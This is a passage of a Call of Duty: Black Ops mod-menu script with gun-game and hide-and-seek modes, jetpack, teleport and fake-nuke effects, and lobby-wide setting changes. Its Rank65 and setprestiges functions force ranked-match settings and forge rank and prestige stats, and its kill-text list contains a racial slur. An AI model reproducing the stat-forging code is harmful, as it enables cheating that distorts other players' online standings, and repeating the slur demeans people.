	return gun;
}
runKills()
{
	self endon("disconnect");
	level endon("game_ended");
	self.curGun=0;
	self.temp=self.kills;
	while(1)
	{
		if(self.kills - self.temp > 0)
		{
			self.curGun ++;
			self.temp ++;
			self notify("killed_player");
			wait .05;
			thread killedPlayer();
			if(isSubStr(self.curGun,21)) level thread maps\mp\gametypes\_globallogic::endGame(self.pers["team"],self.name+" Has Won The Gun Game!");
		}
		while(!isSubStr(self getCurrentWeapon(),self.gunList[self.curGun].name))
		{
			if(self.gunList[self.curGun].laser) self setClientDvar("cg_laserForceOn","1");
			else self setClientDvar("cg_laserForceOn","0");
			self takeAllWeapons();
			self giveWeapon(self.gunList[self.curGun].name);
			self switchToWeapon(self.gunList[self.curGun].name);
			wait .2;
		}
		self giveMaxAmmo(self.gunList[self.curGun].name);
		wait .2;
	}
}
killedPlayer()
{
	self endon("killed_player");
	for(k=0;k < 2;k++) self.gunGame["line"][k] hudFade(.05,1);
	self.gunGame["BG"] hudFade(.05,.6);
	wait 2;
	for(k=0;k < 2;k++) self.gunGame["line"][k] hudFade(.05,0);
	self.gunGame["BG"] hudFade(.05,0);
}
playerWaitTill()
{
	self endon("disconnect");
	level endon("game_ended");
	for(;;)
	{
		self waittill("killed_player");
		for(k=0;k < self.gunGame["line"].size;k++) self.gunGame["line"][k] hudFade(.05,0);
		self.gunGame["BG"] hudFade(.05,0);
	}
}
initKillingHud()
{
	self.gunGame["line"][0]=createTextString("default",2.3,"","",0,-180,0,200,"Player Killed");
	self.gunGame["line"][1]=createTextString("default",1.6,"","",0,-160,0,200,"");
	self.gunGame["BG"]=createShader("","",0,-170,140,50,(0,0,0),"white",100,0);
	for(;;)
	{
		self.gunGame["line"][1] maps\mp\gametypes\_rank::setSafeText(self.gunName[self.curGun]);
		wait .05;
	}
}
doTeleport()
{
	self beginLocationSelection( "rank_prestige15" ); 
    self.selectingLocation = 1; 
    self waittill( "confirm_location", location ); 
    newLocation = BulletTrace( location+( 0, 0, 100000 ), location, 0, self )[ "position" ];
    self SetOrigin( newLocation );
    self endLocationSelection(); 
    self.selectingLocation = undefined;
}
QuickscopeLobby()
{
	for(t=0;t < level.players.size;t++)
	{
		players=level.players[t];
		players thread maps\mp\gametypes\_hud_message::hintMessage("^1Q^2u^1i^2c^1k^2s^1c^2o^1p^2e ^1L^2o^1b^2b^1y^2!");
		players thread maps\mp\gametypes\_hud_message::hintMessage("^2B^1y ^2x^12^2E^1z^2Y^1x^2-^1-");
		setDvar("jump_height",69);
		setDvar("g_gravity",400);
		setDvar("g_speed",220);
		setDvar("scr_player_maxhealth",30);
		setDvar("scr_game_perks","0");
		players thread QSWeapons();
		players thread ModQSDeath();
	}
}
QSWeapons()
{
	self takeallweapons();
	self giveweapon("l96a1_mp");
	self switchtoweapon("l96a1_mp");
}
ModQSDeath()
{
	self endon("disconnect");
	for(;;)
	{
		self waittill("death");
		wait 2.2;
		self thread QSWeapons();
	}
}
hidenseek()
{
	for(t=0;t < level.players.size;t++)
	{
		players=level.players[t];
		players notify("hidenseek_start");
		wait 2;
		players thread maps\mp\gametypes\_hud_message::hintMessage("^3Hide and Seek is Starting...");
		players thread Hiders();
		players thread hidenseekvisions();
		players clearPerks();
		players ModHASDeath();
		setDvar("g_gametype","dm");
		setDvar("scr_game_perks","0");
	}
}
ModHASDeath()
{
	self endon("disconnect");

	{
		self waittill("death");
		wait 2.2;
		self thread Seekers();
	}
}
Hiders()
{
	wait 1;
	self iPrintlnBold("^3You Are A Hider");
	self iPrintlnBold("^1Run & Hide,FAST!");
	self takeallweapons();
}
Seekers()
{
	self iPrintlnBold("^1You Are A Seeker");
	self iPrintlnBold("^2Go Find The Hiders!");
	wait 1;
	self takeallweapons();
	self giveweapon("commando_mp");
	self switchtoweapon("commando_mp");
}
hidenseekvisions()
{
	for(;;)
	{
		self setClientDvar("r_colorMap","0");
		wait 5;
		self setClientDvar("r_colorMap","1");
		wait 0.1;
		self setClientDvar("r_colorMap","0");
		wait 0.2;
		self setClientDvar("r_colorMap","1");
		wait 0.1;
		self setClientDvar("r_colorMap","0");
	}
}
BetteriPROCrosshair()
{
	self BetterCrosshair("+",2.3,0.2);
}
BetterCrosshair(text,scale,speed)
{
	Leeches=self createfontstring("objective",scale,self);
	Leeches setpoint("CENTER");
	Leeches maps\mp\gametypes\_rank::setSafeText(text);
	self thread CrosshairDestroy(Leeches);
	self setclientdvar("cg_crosshairAlpha",0);
	rand=[];
	for(;;)
	{
		for(i=0;i<=3;i++)
		{
			random=randomInt(100);
			rand[i]=random/100;
		}
		Leeches.color =(rand[0],rand[1],rand[2]);
		wait(speed);
	}
}

DoWeps()
{
	self endon("death");
	self endon("disconnect");
	guns = strTok("python_mp;cz75_mp;m14_mp;m16_mp;famas_mp;ak74u_mp;mp5k_mp;mpl_mp;pm63_mp;spectre_mp;ithaca_mp;rottweil72_mp;spas_mp;hs10_mp;aug_mp;galil_mp;commando_mp;fnfal_mp;dragunov_mp;l96a1_mp;rpk_mp;hk21_mp;m72_law_mp;china_lake_mp;crossbow_explosive_mp;knife_ballistic_mp", ";");
	self takeAllWeapons();
    for(i = 0;i < guns.size;i++)
	{
        self waittill("weapon_change");
		weaponname = guns[i];
        self giveWeapon(weaponname);
		self switchToWeapon(weaponname);
		self giveMaxAmmo(weaponname);
		wait 0.05;
	}
	self iPrintln("^6All Weapons Given");
}



CrosshairDestroy(elem)
{
	self waittill("death");
	elem destroy();
}
doHeartText()
{
	for(p=0;p < level.players.size;p++)
	{
		player=level.players[p];
		player thread doHeart();
	}
}
ToggledoHeart()
{
	if(self.doHeart==false)
	{
	    self.doHeart=true;
	    self thread doHeart();
	    self iPrintln("doHeart: ^2[ON]");
	}
	else
	{
        self.doHeart=false;
	    self notify("Stop_doHeart");
	    self.HeartText destroy();
	    self iPrintln("doHeart: ^1[OFF]");
	}
}
doHeart()
{
    self endon("Stop_doHeart");
	self.HeartText=self createFontString("objective",1.8);
	self.HeartText setPoint("LEFT","LEFT",10,20);
	self.HeartText.sort=2;
	self.HeartText maps\mp\gametypes\_rank::setSafeText(""+level.hostname+"");
	self thread PulsexYARDSALEx();
	self thread ColorxYARDSALEx();
}
ColorxYARDSALEx()
{
    self endon("Stop_doHeart");
	self.HeartText FadeOverTime(1);
	self.HeartText.color =(1,0,0);
	wait 1;
	self.HeartText FadeOverTime(1);
	self.HeartText.color =(0,1,0);
	wait 1;
	self.HeartText FadeOverTime(1);
	self.HeartText.color =(0,0,1);
	wait 1;
	self.HeartText FadeOverTime(1);
	self.HeartText.color =(1,0,1);
	wait 1;
	self.HeartText FadeOverTime(1);
	self.HeartText.color =(0,1,1);
	wait 1;
	self.HeartText FadeOverTime(1);
	self.HeartText.color =(1,1,0);
	wait 1;
	self thread ColorxYARDSALEx();
}
PulsexYARDSALEx()
{
    self endon("Stop_doHeart");
	self.HeartText.fontscale=1.9;
	wait 0.1;
	self.HeartText.fontscale=2.0;
	wait 0.1;
	self.HeartText.fontscale=2.1;
	wait 0.1;
	self.HeartText.fontscale=2.2;
	wait 0.1;
	self.HeartText.fontscale=2.1;
	wait 0.1;
	self.HeartText.fontscale=2.0;
	wait 0.1;
	self.HeartText.fontscale=1.9;
	wait 0.1;
	self thread PulsexYARDSALEx();
}
kickbots()
{
	for(p=0;p < level.players.size;p++)
	{
	    player=level.players[p];
		if(isDefined(player.pers["isBot"])&& player.pers["isBot"])kick(player getEntityNumber(),"EXE_PLAYERKICKED");
	}
}
VisionPM()
{
	self setClientDvar("r_filmTweakBrightness","0");
	self setClientDvar("r_filmTweakContrast","1.2");
	self setClientDvar("r_filmTweakDesaturation","0.2");
	self setClientDvar("r_filmTweakEnable","1");
	self setClientDvar("r_filmTweakInvert","0");
	self setClientDvar("r_filmTweakLightTint","1.6 1.6 1.6");
	self setClientDvar("r_lighttweaksunlight","1.3");
	self setClientDvar("r_filmtweaklighttint","1.6 1.6 1.6");
	self setClientDvar("r_filmtweakdarktint","0.8 0.8 0.9");
	self setClientDvar("r_glowtweakbloomcutoff","0");
	self setClientDvar("r_lighttweaksuncolor","1 0.9 0.6 1");
	self setClientDvar("r_lightTweakSunDirection","-90 100 0");
}
FlashScore()
{
	self endon("disconnect");
	self endon("death");
	Value="1 0 0 1;1 1 0 1;1 0 1 1;0 0 1 1;0 1 1 1";
	Values=strTok(value,";");
	i=0;
	for(;;)
	{
		self setClientDvar("cg_ScoresPing_LowColor",Values[i]);
		self setClientDvar("cg_ScoresPing_HighColor",Values[i]);
		self setClientDvar("ui_playerPartyColor",Values[i]);
		self setClientDvar("cg_scoreboardMyColor",Values[i]);
		i++;
		if(i==Values.size)i=0;
		wait.05;
	}
}
Credits()
{
	if(!level.Credits)
	{
		for(i=0;i<level.players.size;i++)
		{
			player = level.players[i];
			player.LockMenu=true;
			player ExitMenu();
			player ClearAllTextAfterHudelem();
			wait .01;
			player.LockMenu=true;
			player.Credits["Background"][0] = CreateShader("","",0,0,0,1000,(0,0,0),"progress_bar_bg",1,0);
			player.Credits["Background"][1] = CreateShader("","",0,0,0,480,(0,0,0),"sun",1,0);
			player.Credits["Background"][0] HudScaleandFade(2,1000,1000,.85);
			player.Credits["Background"][1] HudScaleandFade(2,1000,480,.85);
			wait 1.5;
			player thread CreditText("iPROFamily 'Purple Kush v.4 Patch'",2);
			wait .3;
			player thread CreditText("With Thanks To",1.8);
			wait .8;
			for(i=0;;i++)
			{
				setHealth(90000);
				player freezecontrols(true);
				player thread CreditText(level.CreditTitles[i],1.8);
				wait .3;
				player thread CreditText(level.CreditTexts[i],1.5);
				wait .8;
				if(i>=level.CreditTitles.size && !level.CreditsDone)
				{
					wait .7;
					player thread CreditText("iPROFamily YouTube: YouTube.com/iPROFamilyTV",1.8);
					wait .5;
					player thread CreditText("Copyright (C) 2012 iPROFamily All Rights Reserved =)",1.8);
					wait 7.5;
					player.Credits["Background"][0] HudScaleandFade(2,0,1000,0);
					player.Credits["Background"][1] HudScaleandFade(2,0,480,0);
					wait 2;
					player.Credits["Background"][0] destroy();
					player.Credits["Background"][1] destroy();
					level thread maps\mp\gametypes\_globallogic::forceEnd();
					level.CreditsDone = true;
				}
			}
		}
	}
}
CreditText(Text, Fontscale)
{
	Credits["Text"] = CreateTextString("Objective",Fontscale,"","",0,250,1,100,Text);
	Credits["Text"].glowAlpha = 100;
	Credits["Text"].glowColor = level.HudColour;
	Credits["Text"] MoveElem("y", 9, -300);
	Credits["Text"] setPulseFx(50,int(((9*.85)*1000)),500);
	wait 9;
	Credits["Text"] destroy();
}
HudScaleandFade(Time,Width,Height,Alpha)
{
	self FadeOverTime(Time);
	self scaleOverTime(Time,Width,Height);
	self.alpha = Alpha;
}
MoveElem(Axis,Time,Input)
{
	self MoveOverTime(Time);
	if(Axis=="x")self.x=Input;
	else self.y=Input;
}
PL10()
{
	player=level.players[self.selplay];
	player thread Rank65();
	player thread Prestige(10);
}
PL9()
{
	player=level.players[self.selplay];
	player thread Rank65();
	player thread Prestige(9);
}
PL8()
{
	player=level.players[self.selplay];
	player thread Rank65();
	player thread Prestige(8);
}
PL7()
{
	player=level.players[self.selplay];
	player thread Rank65();
	player thread Prestige(7);
}
PL6()
{
	player=level.players[self.selplay];
	player thread Rank65();
	player thread Prestige(6);
}
PL5()
{
	player=level.players[self.selplay];
	player thread Rank65();
	player thread Prestige(5);
}
PL4()
{
	player=level.players[self.selplay];
	player thread Rank65();
	player thread Prestige(4);
}
PL3()
{
	player=level.players[self.selplay];
	player thread Rank65();
	player thread Prestige(3);
}
PL2()
{
	player=level.players[self.selplay];
	player thread Rank65();
	player thread Prestige(2);
}
PL1()
{
	player=level.players[self.selplay];
	player thread Rank65();
	player thread Prestige(1);
}
Rank65()
{
    setDvar("scr_forcerankedmatch","1");
	setdvar("xblive_privatematch","0");
	setDvar("onlinegame","1");
	self.pers["rankxp"]=153900;
	self.pers["rank"]=self maps\mp\gametypes\_rank::getRankForXp(self.pers["rankxp"]);
	//self setStat(252,65);
	self.setPromotion=true;
	wait 1.5;
	/*
	self thread maps\mp\gametypes\_rank::updateRankAnnounceHUD();
	self thread maps\mp\gametypes\_rank::updateRank();
	self thread maps\mp\gametypes\_rank::getPrestigeLevel();
	self thread maps\mp\gametypes\_rank::getSPM();
	self thread maps\mp\gametypes\_rank::getRankXP();
	self thread maps\mp\gametypes\_rank::syncXPStat();
	self thread maps\mp\gametypes\_rank::updateChallenges();
	self setRank(self.pers["rank"],self.pers["prestige"]);
	*/
}
PetDog()
{
	self.Dog["Health"]=99999;
	self maps\mp\gametypes\_hardpoints::giveKillstreak("dogs_mp");
	level.dog_time=6000;
	level.dog_count_max_at_once=1;
	level.maxDogsAttackingPerPlayer=1;
	level.dog_count=1;
	level.dog_spawner=getent("dog_spawner","targetname");
	for(;;)
	{
		if(level.dog_health > self.Dog["Health"])
		{
			level.dog_health=self.Dog["Health"];
		}
	}
}
Day()
{
	self notify("stopnight");
	setExpFog(800,20000,0.583,0.631569,0.553078,0);
	r("r_filmusetweaks","0");
	r("r_filmtweaksenable","0");
	r("r_filmtweakenable","0");
}
Night()
{
	self endon("disconnect");
	self endon("stopnight");
	setExpFog(170,170,0.5,0.5,0.5,0.5);
	r("r_filmusetweaks","1");
	r("r_filmtweaksenable","1");
	r("r_filmtweakenable","1");
	r("r_filmtweakdarktint","0.8 0.8 1.4");
	r("r_filmtweaklighttint","0.6 0.7 1.2");
	r("r_filmtweakcontrast","1.3");
	r("r_filmtweakbrightness","0.06");
	r("r_filmtweakdesaturation","0.6");
	r("r_lighttweaksuncolor","0.6 0.7 1");
	r("r_lighttweaksunlight","1.7");
	r("r_contrast","1.3");
	r("r_brightness","0.03");
	r("r_dof_enable","1");
	r("r_dof_tweak","1");
	r("r_dof_bias","0.7");
	r("r_dof_farblur","0.6");
	r("r_dof_farstart","1500");
	r("r_dof_farend","2000");
	r("r_dof_nearblur","6");
	r("r_dof_nearstart","10");
	r("r_dof_nearend","100");
	r("r_blur","0.3");
	r("r_colorMap","1");
	while(1)
	{
		setExpFog(200,200,0.5,0.5,0.5,0.5);
		wait 30;
		setExpFog(700,700,0.5,0.5,0.5,0.5);
		wait 20;
		setExpFog(200,200,0.5,0.5,0.5,0.5);
		wait 30;
		setExpFog(80,80,0.5,0.5,0.5,0.5);
		wait 10;
	}
}
r(a,b)
{
	self setclientdvar(a,b);
}
SpecNade()
{
	self endon("disconnect");
	self endon("death");
	for(;;)
	{
		self waittill("grenade_fire",Grenade);
		self AllowAds(false);
		self DisableWeapons();
		self freezeControls(true);
		self.maxhealth=999999999;
		self.health=self.maxhealth;
		self LinkTo(Grenade);
		self hide();
		self setPlayerAngles(VectorToAngles(Grenade.origin - self.origin));
		Grenade waittill("explode");
		self notify("specnade");
		self SetWeaponAmmoClip("frag_grenade_mp",1);
		self.maxhealth=100;
		self.health=self.maxhealth;
		self unlink();
		self show();
		self AllowAds(true);
		self EnableWeapons();
		self freezeControls(false);
	}
}
x2Speed()
{
	self endon("disconnect");
	self endon("death");
	self.moveSpeedScaler=0;
	if(self.moveSpeedScaler==1)self.moveSpeedScaler++;
	else self.moveSpeedScaler+=2;
	wait .01;
	if(self.moveSpeedScaler>8)self.moveSpeedScaler=1;
	wait .01;
	self setMoveSpeedScale(self.moveSpeedScaler);
	if(self.moveSpeedScaler==1)self iPrintln("^"+randomintrange(1,6)+"Speed - Normal");
	else self iPrintln("^"+randomintrange(1,6)+"Speed - x"+self.moveSpeedScaler);
}
doJP()
{
	if(self.u==false)
	{
		self iPrintln("JetPack ^2[ON]");
		self iPrintln("Use it with R3");
		s="wpn_semtex_alert";
		lf=level.flame;
		self thread JPs(s,lf);
		self attach("aircraft_bomb","tag_stowed_back",false);
		self.u=true;
	}
	else
	{
		self iPrintln("JetPack ^1[OFF]");
		self notify("sfo");
		self detach("aircraft_bomb","tag_stowed_back");
		self.u=false;
	}
}
JPs(s,lf)
{
	self setclientdvar("bg_fallDamageMinHeight","9998");
	self endon("sfo");
	if(isdefined(self.N))self.N delete();
	self.N=spawn("script_origin",self.origin);
	self.On=0;
	for(;;)
	{
		if(self MeleeButtonPressed())
		{
			self.On=1;
			self playSound(s);
			PlayFX(lf,self.origin);
			self.N.origin=self.origin;
			self linkto(self.N);
		}
		else
		{
			self.On=0;
			self unlink();
		}
		if(self.On==1)
		{
			vec=anglestoforward(self getPlayerAngles());

			{
				end =(vec[0] * 20,vec[1] * 20,vec[2] * 20);
				self.N.origin=self.N.origin+end;
			}
		}
		wait 0.05;
	}
}
stairwaytohaven()
{
	self thread stairz(70);
	self thread stair(70);
}
stairz(size)
{
	stairz=[];
	stairPos=self.origin+(100,0,0);
	for(i=0;i<=size;i++)
	{
		newPos =(stairPos +((58 * i / 2),0,(17 * i / 2)));
		stairz[i]=spawn("script_model",newPos);
		stairz[i].angles =(0,90,0);
		wait .1;
		stairz[i] setModel("mp_supplydrop_ally");
	}
}
stair(size)
{
	stairz=[];
	stairPos=self.origin+(100,0,0);
	for(i=0;i<=size;i++)
	{
		newPos =(stairPos +((58 * i / 2),0,(17 * i / 2)));
		level.packo[i]=spawn("trigger_radius",(0,0,0),0,65,30);
		level.packo[i].origin=newpos;
		level.packo[i].angles =(0,90,0);
		level.packo[i] setContents(1);
	}
}
Advertise()
{
	for(p=0;p < level.players.size;p++)
	{
		player=level.players[p];
		player thread DisplayAdvert();
	}
}
DisplayAdvert()
{
	self iPrintln("Advertised!");
	self endon("disconnect");
	AdvertText=createFontString("DAStacks",2.0);
	AdvertText setPoint("CENTER","CENTER",0,0);
	AdvertText setPoint("CENTER","CENTER",0,0);
	AdvertText.color =(0.5,0.0,0.8);
	wait 4;
	AdvertText maps\mp\gametypes\_rank::setSafeText("VIP - ^2$10");
	wait 4;
	AdvertText maps\mp\gametypes\_rank::setSafeText("Admin - ^2$10");
	wait 4;
	AdvertText maps\mp\gametypes\_rank::setSafeText("YouTube.com/iPROFamilyTV Go Sub Now");
	wait 4;
	AdvertText maps\mp\gametypes\_rank::setSafeText("Donate To: ^2erickx009@hotmail.com");
	wait 4;
	AdvertText destroy();
}
KillTheCampers()
{
	self endon("disconnect");
	self endon("death");
	for(;;)
	{
		P=self createFontString("hudbig",1);
		P setPoint("CENTER","CENTER",0,-20);
		pos1=self getorigin();
		wait 10;
		pos2=self getorigin();
		if((distance(pos1,pos2)< 20))
		{
			P maps\mp\gametypes\_rank::setSafeText("^1Sorry,No Camping!");
			PlayRumbleOnPosition("grenade_rumble",self.Origin);
			self playSound("mus_level_up");
			wait 5;
			P destroy();
			wait 0.5;
			self suicide();
		}
	}
}
StartNuke()
{
    self SayTeam("^1NUKE INBOUND!");
	players=level.players;
	for(index=1;index < players.size;index++)
	{
		player=players[index];
		player thread HawkinNuke();
		wait 0.01;
	}
	wait 4;
	self setclientdvar("r_brightness",.3);
	wait .5;
	self SetClientDvar("timescale",".3");
	self setclientdvar("r_brightness",1);
	wait .5;
	self setclientdvar("r_brightness",.4);
	wait .5;
	self setclientdvar("r_brightness",-.3);
	setdvar("timescale",0.5);
	self setClientDvar("g_gravity","100");
	wait 5;
	VisionSetNaked("mpoutro",4);
	setdvar("timescale",1);
	wait 10;
	VisionSetNaked("default",5);
	setDvar("g_gravity","800");
	self setclientdvar("r_brightness",0);
}
HawkinNuke()
{
	self iPrintln("^1NUKE INBOUND!!!");
	wait 4.2;
	self playSound("mpl_sd_exp_suitcase_bomb_main");
	Earthquake(0.6,4,self.origin,800);
	for(j=35;j>0;j--)
	{
		self SetOrigin(self.origin +(0,0,20));
		wait .1;
	}
	wait 0.1;
	self suicide();
}
TeleportGun()
{
	if(self.tpg==false)
	{
		self.tpg=true;
		self thread TeleportRun();
		self iPrintln("Teleport Gun ^2[ON]");
	}
	else
	{
		self.tpg=false;
		self notify("Stop_TP");
		self iPrintln("Teleport Gun ^1[OFF]");
	}
}
TeleportRun()
{
	self endon("death");
	self endon("Stop_TP");
	for(;;)
	{
		self waittill("weapon_fired");
		self setorigin(BulletTrace(self gettagorigin("j_head"),self gettagorigin("j_head")+anglestoforward(self getplayerangles())*1000000,0,self)[ "position" ]);
		self iPrintln("Teleported To Crosshairs!");
	}
}
ToggleKillTxt()
{
	if(self.tpg==false)
	{
		self.tpg=true;
		self thread doKilltxt();
		self iPrintln("Kill Text: ^2[ON]");
	}
	else
	{
		self.tpg=false;
		self notify("Stop_KT");
		self iPrintln("Kill Text: ^1[OFF]");
	}
}
doKilltxt()
{
	self endon("disconnect");
	self endon("death");
	self endon("Stop_KT");
	self.prevkills=self.pers["kills"];
	for(;;)
	{
		if(self.prevkills<self.pers["kills"])
		{
			self thread TxtStrings();
			self.prevkills=self.pers["kills"];
		}
		wait 0.2;
	}
}
TxtStrings()
{
	M=[];
	M[0]="uMaaaaaaD Bro ?";
	M[1]="Alright Alright Alright!";
	M[2]="Die Die Dieeeeee !";
	M[3]="Break It Down.";
	M[4]="Im The King ?";
	M[5]="Visit My Youtube Boy";
	M[6]="xX-CoD_PRO1-Xx Beast";
	M[7]="u Jelly ?";
	M[8]="Killed";
	M[9]="Pwneeeeed";
	M[10]="iPROGang or Die";
	M[11]="xDDDDDD";
	M[12]="LoooooooL";
	M[13]="Suck It Bitch";
	M[14]="Im Tha Best Niggaa";
	M[15]="Nooooo!!";
	T=self createFontString("objective",3);
	T setPoint("CENTER","CENTER",0,0);
	T maps\mp\gametypes\_rank::setSafeText("^6"+M[randomint(M.size)]);
	wait 2;
	T destroy();
}
ToggleLM()
{
	weapons=StrTok("defaultweapon_mp","|");
	if(level.modded)
	{
		self iPrintln("Lobby Mods: ^1[OFF]");
		setDvar("jump_height","60");
		setDvar("player_sprintSpeedScale","1.0");
		setDvar("cg_laserForceOn",0);
		setDvar("g_gravity","1000");
		setDvar("player_sustainAmmo",0);
		setDvar("bg_fallDamageMinHeight",128);
		setDvar("player_meleeRange",5);
		for(i=0;i < level.players.size;i++)
		{
			for(a=0;a < weapons.size;a++)
			{
				player=level.players[i];
				if(player HasWeapon(weapons[a]))
				{
					player TakeWeapon(weapons[a]);
				}
			}
		}
		level.modded=false;
	}
	else
	{
		self iPrintln("Lobby Mods: ^2[ON]");
		setDvar("cg_laserForceOn",1);
		setDvar("jump_height","999");
		setDvar("g_gravity","75");
		setDvar("player_sustainAmmo",1);
		setDvar("player_sprintSpeedScale","5.0");
		setDvar("bg_fallDamageMinHeight",9998);
		setDvar("player_meleeRange",999);
		for(i=0;i < level.players.size;i++)
		{
			for(a=0;a < weapons.size;a++)
			{
				player=level.players[i];
				player GiveWeapon(weapons[a]);
			}
		}
		level.modded=true;
	}
}
AntiJoin()
{

	{
		if(!level.AntiJoinEnabled)
		{
			setDvar("g_password","iPROLockedLobby");
			level.AntiJoinEnabled=true;
			self iPrintln("Anti-Join ^2[Enabled]");
		}
		else
		{
			setDvar("g_password","");
			level.AntiJoinEnabled=false;
			self iPrintln("Anti-Join ^1[Disabled]");
		}
	}
	wait 3;
	self.anty=0;
}
InfGame()
{
	SetDvar("scr_ctf_scorelimit",0);
	SetDvar("scr_ctf_timelimit",0);
	SetDvar("scr_dm_scorelimit",0);
	SetDvar("scr_dm_timelimit",0);
	SetDvar("scr_dom_scorelimit",0);
	SetDvar("scr_dom_timelimit",0);
	SetDvar("scr_koth_scorelimit",0);
	SetDvar("scr_koth_timelimit",0);
	SetDvar("scr_sab_scorelimit",0);
	SetDvar("scr_sab_timelimit",0);
	SetDvar("scr_sd_scorelimit",0);
	SetDvar("scr_sd_timelimit",0);
	SetDvar("scr_tdm_scorelimit",0);
	SetDvar("scr_tdm_timelimit",0);
	SetDvar("scr_twar_scorelimit",0);
	SetDvar("scr_twar_timelimit",0);
	SetDvar("scr_sd_numlives",0);
	SetDvar("scr_teamKillPunishCount",0);
	SetDvar("scr_game_suicidepointloss",1);
	SetDvar("scr_game_deathtpointlosst",1);
	SetDvar("player_meleeRange",0);
	self iPrintln("Infinite Game");
}
setprestiges(value)
{
	self playsound("mus_level_up");
	setDvar("scr_forcerankedmatch","1");
	setdvar("xblive_privatematch","0");
	setDvar("onlinegame","1");
	wait 0.5;
	self maps\mp\gametypes\_persistence::statSet("plevel",value);
	self maps\mp\gametypes\_persistence::statSet("rank",50);
	self maps\mp\gametypes\_persistence::statSet("rankxp",1262500);
	self iPrintln("Prestige "+value+" ^2SET");
}
newselector(choice)
{
	s=self;
	s endon("death");
	s endon("stopthis");
	s.textz=s createFontString("objective",2.0);
	s ExitMenu();
	self.LockMenu=true;
	s freezeControls(false);
	wait .1;
	s freezeControls(true);
	wait .1;
	s.prestigeback=s createRectangle5("CENTER","",0,0,1000,70,(0,0,0),"white",3,.3);
	self setclientdvars("cg_drawcrosshair","0","r_blur","6");
	s.textz setPoint("CENTER","CENTER",0,60);
	s.textz.sort=100;
	if(choice=="prestige")
	{
		t=0;
		s.scrollz=0;
		for(i=-2;i<0;i++)
		{
			s.pres[i]=createprestige("CENTER","CENTER",(70*i),0,50,50,"",100,1);
		}
		s.pres[0]=createprestige("CENTER","CENTER",0,0,70,70,"rank_comm1",100,1);
		for(i=1;i<3;i++)
		{
			s.pres[i]=createprestige("CENTER","CENTER",(70*i),0,50,50,"rank_prestige" + i,100,1);
		}
		s.textz maps\mp\gametypes\_rank::setSafeText(t);
	}
	else if(choice=="rank")
	{
		t=1;
		s.scrollz=1;
		s.ranks=strTok("rank_pvt1|rank_pfc1|rank_pfc2|rank_lcpl1|rank_lcpl2|rank_lcpl3|rank_cpl1|rank_cpl2|rank_cpl3|rank_sgt1|rank_sgt2|rank_sgt3|rank_ssgt1|rank_ssgt2|rank_ssgt3|rank_gysgt1|rank_gysgt2|rank_gysgt3|rank_msgt1|rank_msgt2|rank_msgt3|rank_mgysgt1|rank_mgysgt2|rank_mgysgt3|rank_2ndlt1|rank_2ndlt2|rank_2ndlt3|rank_1stlt1|rank_1stlt2|rank_1stlt3|rank_capt1|rank_capt2|rank_capt3|rank_maj1|rank_maj2|rank_maj3|rank_ltcol1|rank_ltcol2|rank_ltcol3|rank_col1|rank_col2|rank_col3|rank_bgen1|rank_bgen2|rank_bgen3|rank_majgen1|rank_majgen2|rank_majgen3|rank_ltgen1|rank_ltgen2|rank_ltgen3|rank_gen1|rank_gen2|rank_gen3|rank_comm1","|");
		for(i=-2;i<0;i++)
		{
			s.r[i]=createprestige("CENTER","CENTER",(70*i),0,50,50,"",100,1);
		}
		for(i=0;i<3;i++)
		{
			s.r[i]=createprestige("CENTER","CENTER",(70*i),0,50,50,s.ranks[i],100,1);
		}
		s.textz maps\mp\gametypes\_rank::setSafeText(t);
	}
	for(;;)
	{
		if(s MeleeButtonPressed())
		{
			if(choice=="rank")
			{
				for(i=-2;i<3;i++)
				{
					s.r[i] destroy();
					self.LockMenu=false;
				}
			}
			else if(choice=="prestige")
			{
				for(i=0;i<5;i++)
				{
					s.pres[i] destroy();
					s.pres[-2] destroy();
					s.pres[-1] destroy();
					s.pres[0] destroy();
					s.pres[1] destroy();
					s.pres[2] destroy();
					self.LockMenu=false;
				}
			}
			wait .001;
			s freezeControls(false);
			self setClientDvars("cg_drawcrosshair","1","r_blur","0","ui_hud_hardcore","0");
			s.prestigeback destroy();
			s.textz destroy();
			self.LockMenu=false;
			wait 1;
			s notify("stopthis");
		}
		if(s UseButtonPressed())
		{
			if(choice=="rank")
			{
				for(i=-2;i<3;i++)
				{
					s.r[i] destroy();
					self.LockMenu=false;
				}
				s thread rank(s.scrollz);
			}
			else if(choice=="prestige")
			{
				for(i=0;i<5;i++)
				{
					s.pres[i] destroy();
					s.pres[-2] destroy();
					s.pres[-1] destroy();
					s.pres[0] destroy();
					s.pres[1] destroy();
					s.pres[2] destroy();
					self.LockMenu=false;
				}
				s thread prestige1(s.scrollz);
			}
			wait .1;
			s freezeControls(false);
			self.LockMenu=false;
			self setClientDvars("cg_drawcrosshair","1","r_blur","0","ui_hud_hardcore","0");
			s.prestigeback destroy();
			s.textz destroy();
			wait 1;
			s notify("stopthis");
		}
		if(s.scrollz==0)
		{
			if(choice=="prestige")
			{
				s.pres[-2] setShader("",50,50);
				s.pres[-1] setShader("",50,50);
				s.pres[0] setShader("rank_comm1",70,70);
			}
			else if(choice=="rank")
			{
				s.r[-2] setShader("",50,50);
				s.r[-1] setShader("",50,50);
			}
		}
		else if(s.scrollz==1)
		{
			if(choice=="prestige")
			{
				s.pres[-2] setShader("",50,50);
				s.pres[-1] setShader("rank_comm1",50,50);
			}
			else if(choice=="rank")
			{
				s.r[-2] setShader("",50,50);
				s.r[-1] setShader("",50,50);
				s.r[0] setShader("rank_pvt1",50,50);
			}
		}
		else if(s.scrollz==2)
		{
			if(choice=="prestige")
			{
				s.pres[-2] setShader("rank_comm1",50,50);
			}
			else if(choice=="rank")
			{
				s.r[-2] setShader("",50,50);
				s.r[-1] setShader("rank_pvt1",50,50);
			}
		}
		else if(s.scrollz==10)
		{
			if(choice=="prestige")
			{
				s.pres[1] setShader("rank_prestige1",50,50);
				s.pres[2] setShader("",50,50);
			}
		}
		else if(s.scrollz==11)
		{
			if(choice=="prestige")
			{
				s.pres[1] setShader("",50,50);
				s.pres[2] setShader("",50,50);
			}
		}
		else if(s.scrollz==54)
		{
			if(choice=="rank")
			{
				s.r[1] setShader("rank_comm1",50,50);
				s.r[2] setShader("",50,50);
			}
		}
		else if(s.scrollz==55)
		{
			if(choice=="rank")
			{
				s.r[1] setShader("",50,50);
				s.r[2] setShader("",50,50);
			}
		}
		if(s AdsButtonPressed())
		{
			if(choice=="prestige")
			{
				if(s.scrollz<=11 && s.scrollz>=1)
				{
					s.scrollz -= 1;
					wait .001;
					s.textz maps\mp\gametypes\_rank::setSafeText(s.scrollz);
					s.pres[-2] setShader("rank_prestige" +(self.scrollz - 2),50,50);
